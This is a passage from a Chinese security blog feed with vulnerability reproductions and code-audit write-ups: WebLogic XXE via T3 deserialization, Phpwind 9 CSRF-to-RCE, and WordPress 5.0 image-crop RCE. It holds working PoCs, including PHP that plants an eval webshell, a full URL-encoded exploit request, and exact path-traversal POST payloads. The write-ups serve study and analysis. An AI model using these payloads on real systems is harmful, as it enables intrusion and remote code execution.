qname);</span><br><span class="line"></span><br><span class="line">            Field f2 = umh.getClass().getDeclaredField(<span class="string">"xmlHeader"</span>);</span><br><span class="line">            f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f2.set(umh, xmlHeader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> umh;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行PoC测试下(生成的步骤与第一个漏洞点一样)，使用T3协议脚本向WebLogic 7001端口发送序列化数据:</p><p><img src="../images/weblogic-xxe/16.png" alt=""></p><p><img src="../images/weblogic-xxe/20.png" alt=""></p><h3 id="WsrmSequenceContext-漏洞点分析"><a href="#WsrmSequenceContext-漏洞点分析" class="headerlink" title="WsrmSequenceContext 漏洞点分析"></a>WsrmSequenceContext 漏洞点分析</h3><p>这个类看似需要构造的东西挺多的，<code>readExternal</code>与<code>writeExternal</code>的逻辑也比前两个复杂些，但是PoC构造也很容易</p><p>新建<code>WsrmSequenceContext</code>类，修改</p><p><img src="../images/weblogic-xxe/19.png" alt=""></p><p>PoC如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        EndpointReference acksTo = <span class="keyword">new</span> EndpointReference();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        WsrmSequenceContext wsc = <span class="keyword">new</span> WsrmSequenceContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field f1 = wsc.getClass().getDeclaredField(<span class="string">"acksTo"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(wsc, acksTo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wsc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试下，使用T3协议脚本向WebLogic 7001端口发送序列化数据:</p><p><img src="../images/weblogic-xxe/16.png" alt=""></p><p><img src="../images/weblogic-xxe/21.png" alt=""></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>好了，分析完成了。第一次分析Java的漏洞，还有很多不足的地方，但是分析的过程中也学到了很多，就算是一个看似很简单的点，如果不熟悉Java的一特性，会花费较长的时间去折腾。所以，一步一步走吧，不要太急躁，还有很多东西要学。</p>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Phpwind9-GET型CSRF任意代码执行漏洞复现与分析</title>
      <link href="/Phpwind9-GET%E5%9E%8BCSRF%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">总有一段路,需要一个人走,那就一个人,勇敢的走完</blockquote><blockquote><p>学习wooyun1000个代码审计案例,看到很有技巧性的漏洞跟踪学习下</p></blockquote><a id="more"></a><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><ul><li>Windows10</li><li>php5.6</li><li>phpwind9.0</li></ul><h4 id="漏洞要求"><a href="#漏洞要求" class="headerlink" title="漏洞要求"></a>漏洞要求</h4><ul><li>系统为windows</li><li>需要有访问后台<strong>任务中心</strong>权限</li></ul><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li><p><strong>step1</strong> 生成反序列化poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// test.php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"test2.php"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_callback;</span><br><span class="line">    <span class="keyword">private</span> $_args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_callback = [</span><br><span class="line">            <span class="string">'assert'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_args = [</span><br><span class="line">            [<span class="string">"phpinfo() &amp;&amp; file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;');"</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> stdClass();</span><br><span class="line">$obj-&gt;a = <span class="keyword">new</span> src\library\utility\PwDelayRun();</span><br><span class="line">$obj-&gt;b = <span class="keyword">new</span> PwDelayRun();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">src</span>\<span class="title">library</span>\<span class="title">utility</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/phpwind-csrf-rce/1.png" alt=""></p></li><li><p><strong>step2</strong> 使用admin账户登陆,然后请求<code>http://127.0.0.1/phpwind9.0/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A30%3A%22src%5Clibrary%5Cutility%5CPwDelayRun%22%3A0%3A%7B%7Ds%3A1%3A%22b%22%3BO%3A10%3A%22PwDelayRun%22%3A2%3A%7Bs%3A21%3A%22%00PwDelayRun%00_callback%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7Ds%3A17%3A%22%00PwDelayRun%00_args%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A79%3A%22phpinfo%28%29%3Bfile_put_contents%28%27shell.php%27%2C%27%3C%3Fphp+eval%28%24_REQUEST%5B233%5D%29%3B+%3F%3E%27%29%3Bexit%3B%22%3B%7D%7D%7D%7D</code></p><p>代码成功执行</p><p><img src="../images/phpwind-csrf-rce/2.png" alt=""></p><p>shell成功写入</p><p><img src="../images/phpwind-csrf-rce/3.png" alt=""></p></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="全局搜索找到反序列化位置"><a href="#全局搜索找到反序列化位置" class="headerlink" title="全局搜索找到反序列化位置"></a>全局搜索找到反序列化位置</h4><p>漏洞位置一共三处:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/src/applications/admin/TaskConditionBbsController.php</span><br><span class="line">/src/applications/admin/TaskConditionMemberController.php</span><br><span class="line">/src/applications/admin/TaskRewardController.php</span><br></pre></td></tr></table></figure><p>这里使用<code>/src/applications/admin/TaskConditionMemberController.php</code></p><p><img src="../images/phpwind-csrf-rce/4.png" alt=""></p><p><code>$var = unserialize($this-&gt;getInput(&#39;var&#39;));</code><br>,从Input中获取var参数的值,进行反序列化。 这个Input可以来自<code>get/post/cookie</code>。只要在phpwind里找到反序列化可以利用的点,就能在这里触发反序列化漏洞。 </p><h4 id="全局搜索-destruct"><a href="#全局搜索-destruct" class="headerlink" title="全局搜索_destruct"></a>全局搜索<code>_destruct</code></h4><p>可以找到一个PwDelayRun类,其中遍历了<code>_callback</code>数组,用<code>call_user_func_array</code>执行任意函数。这里如果<code>_callback</code>可控,那么就可以直接执行assert+任意代码了。在<code>/src/applications/admin/TaskConditionMemberController.php</code>中,输入可以控制PwDelayRun类的序列化字符串,但是在执行反序列话之前必须定义了PwDelayRun类(也就是在此之前要包含过PwDelayRun所在的文件) </p><p>在<code>TaskConditionMemberController::beforeAction::unserialize</code>处下端点,并在之前输出当前所定义的所有类 </p><p><img src="../images/phpwind-csrf-rce/5.png" alt=""> </p><p>访问连接<code>http://127.0.0.1/phpwind9.0/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var=</code> </p><p><img src="../images/phpwind-csrf-rce/6.png" alt=""> </p><p>可以看到在此之前没有定义过PwDelayRun类,那么即使反序列化也不会调用相关方法 </p><h4 id="spl-autoload包含任意php文件"><a href="#spl-autoload包含任意php文件" class="headerlink" title="spl_autoload包含任意php文件"></a>spl_autoload包含任意php文件</h4><p>为了包含PwDelayRun类,作者提到了使用<code>spl_autoloa</code>方法,就是说如果要使用的类不存在,会调用框架自己注册的autoload方法加载类。在phpwind9中,实现了autoload方法,并注册了 </p><p><img src="../images/phpwind-csrf-rce/7.png" alt=""> </p><p><img src="../images/phpwind-csrf-rce/8.png" alt=""> </p><p>但是这里className没有路径,PwDelayRun类在<code>src/library/utility/PwDelayRun.php</code>文件中,需要传入路径才可以包含到这个类。 虽然类名不能包含特殊字符,但类名中是可以包含<code>\</code>的,这是php中空间命名。命名空间中可以包含<code>\</code>,而在windows下,<code>\</code>也可以作为路径的分隔符,因此可以在payload中使用命名空间生成序列化字符串,在phpwind9中找不到类的时候,就会使用include包含。而包含时<code>\</code>只能在windows上使用,所以只限于windows系统。 </p><p>但是,这里将类名设置为<code>src\library\utility\PwDelayRun</code>,而 整个phpwind全局是没有使用命名空间的,也就是默认命名空间为<code>\</code>,但现在的PwDelayRun类所在的命名空间为<code>src\library\utility</code>。 这样,即使我包含了<code>src\library\utility\PwDelayRun.php</code>文件,反序列化的时候是实例化的<code>src\library\utility\PwDelayRun</code>类。但phpwind的命名空间是<code>\</code>,上下文存在的类是<code>\PwDelayRun</code>类,还是无法正常进行(得到的是一个不完整的类<code>__php_incomplete_class</code>,这是因为php反序列化一个对象,PHP无法找到原始类,所以PHP不知道,这个类是怎么样的): </p><p><img src="../images/phpwind-csrf-rce/9.png" alt=""> </p><p>只要生成<code>src\library\utility\PwDelayRun</code>类和<code>\PwDelayRun</code>类两个对象,放在一个数组中,在反序列化前者的过程中include目标文件,在反序列化后者的过程中拿到PwDelayRun对象</p><h4 id="利用数组-命名空间加载相同名字的类"><a href="#利用数组-命名空间加载相同名字的类" class="headerlink" title="利用数组+命名空间加载相同名字的类"></a>利用数组+命名空间加载相同名字的类</h4><p>生成<code>src\library\utility\PwDelayRun</code>类和<code>\PwDelayRun</code>类两个对象,放在一个数组中,在反序列化前者的过程中include目标文件,在反序列化后者的过程中拿到PwDelayRun对象。但是有个数组判断,</p><p><img src="../images/phpwind-csrf-rce/10.png" alt=""></p><p>这里如果反序列化后是个数组,就会保存到output中,导致变量不会在beforeAction结束时销毁,而是在脚本束时销毁。如果在结束时销毁,由于没有了上下文,poc中写文件那一步是写不进去的,除非文件路径给绝对给绝对路径,自己可以测试下。作者在分析中给了一个方法,就是用其他对象来替代数组,比如stdClass,</p><p>所以最后得到如下poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// test1.php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"test2.php"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_callback;</span><br><span class="line">    <span class="keyword">private</span> $_args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_callback = [</span><br><span class="line">            <span class="string">'assert'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_args = [</span><br><span class="line">            [<span class="string">"phpinfo() &amp;&amp; file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;')"</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> stdClass();</span><br><span class="line">$obj-&gt;a = <span class="keyword">new</span> src\library\utility\PwDelayRun();</span><br><span class="line">$obj-&gt;b = <span class="keyword">new</span> PwDelayRun();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">src</span>\<span class="title">library</span>\<span class="title">utility</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>由于上面的代码执行链接是get请求,不需要post中的csrftoken或其他验证,所以可以写个帖子,插入恶意链接,等待管理员点击。但是帖子中把&amp;编码了,导致请求不正常,不过可以增加一步跳转</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个漏洞很犀利和巧妙,所以自己跟踪与学习了下,加强自己的代码审计与分析能力,还有学到一些新技能：</p><ul><li>可以调用<code>get_declared_classes</code>查看当前执行所加载的所有自定义类</li><li>反序列化时,如果反序列化点之前没有加载过要反序列化的类,<code>spl_autoload</code>可能会很有帮助,查看框架是否使用了autoload</li><li>反序列化时,可以使用一种对象替代另一种对象绕过某些判断(比如用stdClass替代array)</li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行)</title>
      <link href="/wordpress-5.0-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(%E4%BB%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C).html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper <a href="https://paper.seebug.org/822/" title="seebugpaper" target="_blank" rel="noopener">seebugpaper</a>与绿盟的分析<a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" title="nsfocusblog" target="_blank" rel="noopener">nsfocusblog</a></p></blockquote><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper <a href="https://paper.seebug.org/822/" title="seebugpaper" target="_blank" rel="noopener">seebugpaper</a>与绿盟的分析<a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" title="nsfocusblog" target="_blank" rel="noopener">nsfocusblog</a></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>windows 10</li><li>phpstudy (php-7.0.12-nts+Apache)</li><li>wordpress 5.0.0 （<strong>注：</strong> 官网的影响版本被修复了，自己去其他地方下载）</li><li>ImageMagick-6.9.3-Q16</li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><p><strong>step1</strong>  查看phpinfo参数</p><p><img src="../images/wordpress5.0-rce/1.png" alt=""></p><p>这几个参数和step2中ImageMagick和php-imagick扩展版本必须对应</p></li><li><p><strong>step2</strong> 下载对应ImageMagick和php-imagick扩展</p><ul><li><p>php-imagick扩展下载：<a href="http://pecl.php.net/package/imagick" title="imagick-dll" target="_blank" rel="noopener">php-imagick</a></p><p>比如我的是windows，php7.0 nts，vc14，x86，non safety，那么我选择如下</p><p><img src="../images/wordpress5.0-rce/2.png" alt=""></p></li><li><p>将下载的扩展包下的</p><p><img src="../images/wordpress5.0-rce/3.png" alt=""></p><p>将红色部分放到php安装目录（有php.ini）下，黄色部分放到安装目录的ext目录下</p></li><li><p>在php.ini中添加imagick扩展</p><p><img src="../images/wordpress5.0-rce/4.png" alt=""></p><p>修改配置后重启查看phpinfo</p><p><img src="../images/wordpress5.0-rce/5.png" alt=""></p><p>去imagemagick官网下载对应版本如上图我应该下载ImageMagick 6.9.3-7 Q16 x86，下载之后配置环境变量，配置好了可以使用convert命令查看是否安装好</p><p><img src="../images/wordpress5.0-rce/6.png" alt=""></p></li></ul></li><li><p><strong>step3</strong>  测试php-imagick能否正常工作与能不能远程加载图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$image = <span class="keyword">new</span> Imagick();</span><br><span class="line">$image-&gt;readImage(<span class="string">'http://bpic.588ku.com/element_origin_min_pic/19/03/01/5011d5b976536a8e0807d11da668db43.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果不能远程加载，那么修改下wordpress的<code>wp-includes/class-wp-image-editor-imagick.php</code>的153行:</p><p><img src="../images/wordpress5.0-rce/7.png" alt=""></p></li><li><p><strong>step4</strong> wordpress安装</p><p>wordpress安装就不说了，一路点击安装</p><p>安装完成后，使用管理员登陆，创建一个具有author权限的用户（利用此漏洞最低权限为author）</p></li></ul><h3 id="漏洞利用链"><a href="#漏洞利用链" class="headerlink" title="漏洞利用链"></a>漏洞利用链</h3><ul><li>通过post meta变量覆盖，将数据库中的图片的<code>_wp_attached_file</code>变量覆盖，这一步是为下一步写入图片马到目录做铺垫</li><li>通过图片裁剪功能，将裁剪后的图片写到我们设定的目录下</li><li>通过post meta变量覆盖，设置<code>_wp_page_template</code>，指定template为图片马</li><li>在模板加载时包含恶意裁剪的图片马</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li><p><strong>step1</strong> 制作一张图片马</p><p>我使用的MagickEXIF修改器<a href="http://www.magicexif.com/" title="magickexif" target="_blank" rel="noopener">MagickEXIF</a>修改图片的exif信息制作的图片马</p><p>使用方式是直接拖进MagickEXIF，修改图片exif信息就可以了</p><p><img src="../images/wordpress5.0-rce/8.png" alt=""></p></li><li><p><strong>step2</strong> 覆盖<code>_wp_attached_file变量</code></p><ul><li><p>上传setp1制作的图片马</p><p><img src="../images/wordpress5.0-rce/9.png" alt=""></p><p>此时查看wordpress数据库的<code>wp_postmeta</code>表，_wp_attached_file默认是图片上传所在路径（即<code>wp-content/uploads/2019/03</code>）</p><p><img src="../images/wordpress5.0-rce/10.png" alt=""></p></li><li><p>编辑图片信息并抓包</p><p><img src="../images/wordpress5.0-rce/11.png" alt=""></p><p>抓包</p><p><img src="../images/wordpress5.0-rce/12.png" alt=""></p><p>在repeater中修改包，添加如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_attached_file]=2019/03/3-1.jpg#/../../../../themes/twentynineteen/shell.jpg</span><br></pre></td></tr></table></figure><p>注意<code>#</code>前半部分setp1图片上传所在路径，后半部分可以任意。使用repeater重新发包记得删掉<code>content-length</code></p><p><img src="../images/wordpress5.0-rce/13.png" alt=""></p></li><li><p>查看<code>wp_postmeta</code>表，<code>_wp_attached_file</code>已经被覆盖</p><p><img src="../images/wordpress5.0-rce/14.png" alt=""></p></li></ul></li><li><p><strong>step3</strong> 裁剪图片，将裁剪后的图片写到任意目录下（我上面的路径为<code>wp-content/themes/twentynineteen/shell.jpg</code>）</p><p><img src="../images/wordpress5.0-rce/15.png" alt=""></p><p>抓包</p><p><img src="../images/wordpress5.0-rce/16.png" alt=""></p><p>在repeater中，将post数据修改为如下（记得删除content-length，数据包中的_ajax_nonce为你数据包中的nonce，id你数据包 中的postid）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=crop-image&amp;_ajax_nonce=e6c1b51c5b&amp;id=22&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=500&amp;cropDetails[height]=750&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure><p><img src="../images/wordpress5.0-rce/18.png" alt=""></p><p><img src="../images/wordpress5.0-rce/17.png" alt=""></p><p>查看下文件exif信息，恶意代码还保留着</p><p><img src="../images/wordpress5.0-rce/19.png" alt=""></p></li><li><p><strong>step4</strong> 覆盖<code>_wp_page_template</code>变量</p><ul><li><p>再上传一个txt文件，和前面上传图片一样</p></li><li><p>修改文件信息并抓包改包</p><p>数据包中添加（图片为刚裁剪后的图片）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_page_template]=cropped-shell-e1551529756623.jpg</span><br></pre></td></tr></table></figure><p><img src="../images/wordpress5.0-rce/20.png" alt=""></p><p>查看数据库,<code>_wp_page_template</code>被覆盖为了我们指定的值</p><p><img src="../images/wordpress5.0-rce/21.png" alt=""></p></li></ul></li><li><p><strong>step5</strong> 包含图片马</p><p>查看text.txt的附件信息，图片马被包含</p><p><img src="../images/wordpress5.0-rce/22.png" alt=""></p><p><img src="../images/wordpress5.0-rce/23.png" alt=""></p></li></ul><p>​   </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="wp-attached-file变量覆盖"><a href="#wp-attached-file变量覆盖" class="headerlink" title="_wp_attached_file变量覆盖"></a><code>_wp_attached_file</code>变量覆盖</h4><p>进入编辑</p><p><img src="../images/wordpress5.0-rce/24.png" alt=""></p><p>进入更新post data</p><p><img src="../images/wordpress5.0-rce/25.png" alt=""></p><p>进入wp_insert_attachment</p><p><img src="../images/wordpress5.0-rce/26.png" alt=""></p><p>进入wp_insert_post</p><p><img src="../images/wordpress5.0-rce/27.png" alt=""></p><p>最后到更新<code>_wp_attached_file</code>这里，可以看到我们自己传递的数据经过一系列复杂的操作及过滤依然没有变</p><p><img src="../images/wordpress5.0-rce/28.png" alt=""></p><h4 id="裁剪图片，将裁剪后的图片写到任意目录下"><a href="#裁剪图片，将裁剪后的图片写到任意目录下" class="headerlink" title="裁剪图片，将裁剪后的图片写到任意目录下"></a>裁剪图片，将裁剪后的图片写到任意目录下</h4><p>进入do_action处理，然后进入到wp_ajax_crop_image</p><p><img src="../images/wordpress5.0-rce/29.png" alt=""></p><p><img src="../images/wordpress5.0-rce/30.png" alt=""></p><p>进入wp_crop_image，可以看到取出了attachment_file，就是我们开始覆盖的值</p><p><img src="../images/wordpress5.0-rce/31.png" alt=""></p><p>创建上传文件夹，这里根据当前日期创建了2019/03文件夹</p><p><img src="../images/wordpress5.0-rce/32.png" alt=""></p><p>接着调用editor（这里是imagick）save方法将裁减的内容保存到dst_file，也就将裁剪后的图片马保存了我们设置的地方</p><p><img src="../images/wordpress5.0-rce/33.png" alt=""></p><h4 id="wp-page-template覆盖"><a href="#wp-page-template覆盖" class="headerlink" title="_wp_page_template覆盖"></a><code>_wp_page_template</code>覆盖</h4><p>这一步和<code>__wp_attached_file</code>覆盖一样，至于如何找到的要覆盖这个变量，应该需要熟悉wordpress和足够的审计经验。我这种小白是不知道大佬如何找的…</p><p><img src="../images/wordpress5.0-rce/34.png" alt=""></p><h4 id="包含裁剪图片马"><a href="#包含裁剪图片马" class="headerlink" title="包含裁剪图片马"></a>包含裁剪图片马</h4><p>根据网上的一些分析，函数<code>get_page_template</code>和<code>get_single_template</code>这两个在函数中调 用了<code>get_page_template_slug</code>函数，而<code>get_page_template_slug</code>又从数据库获取了<code>_wp_page_template</code>，</p><p>只需要找到调用了<code>get_page_template</code>或<code>get_single_template</code>的地方，模板就能被包含</p><p>在上面复现的步骤中，我们点击了查看附件，会进入</p><p><img src="../images/wordpress5.0-rce/35.png" alt=""></p><p>进入get_single_template，可以看到模板被复赋值为图片马</p><p><img src="../images/wordpress5.0-rce/36.png" alt=""></p><p>图片马被包含</p><p><img src="../images/wordpress5.0-rce/37.png" alt=""></p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="http://pecl.php.net/package/imagick" target="_blank" rel="noopener">imagick-dll</a></li><li><a href="http://www.imagemagick.org" target="_blank" rel="noopener">imagemagick</a></li><li><a href="http://www.magicexif.com/" target="_blank" rel="noopener">magickexif</a></li><li><a href="https://paper.seebug.org/822/" target="_blank" rel="noopener">seebugpaper</a></li><li><a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" target="_blank" rel="noopener">nsfocusblog</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>requests redirect bug</title>
      <link href="/requests%20redirect%20bug.html"/>
